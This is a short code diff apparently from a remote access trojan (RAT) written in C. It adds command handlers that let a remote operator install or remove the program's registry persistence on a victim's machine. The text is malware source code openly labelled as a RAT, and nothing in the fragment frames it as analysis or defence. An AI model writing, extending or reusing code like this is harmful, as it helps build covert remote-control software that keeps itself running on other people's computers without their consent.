@@ -171,6 +171,12 @@ int main() {
       fclose(f);
       free(data);
       break;
+    case RAT_PACKET_UNINSTALL:
+      uninstall_from_registry(PROGRAM_NAME);
+      break;
+    case RAT_PACKET_INSTALL:
+      install_to_registry(PROGRAM_NAME);
+      break;
     default:
       LOG_DEBUG("unimplemented opcode %s (%d)", rat_opcode_to_str(p->op),
                 p->op);
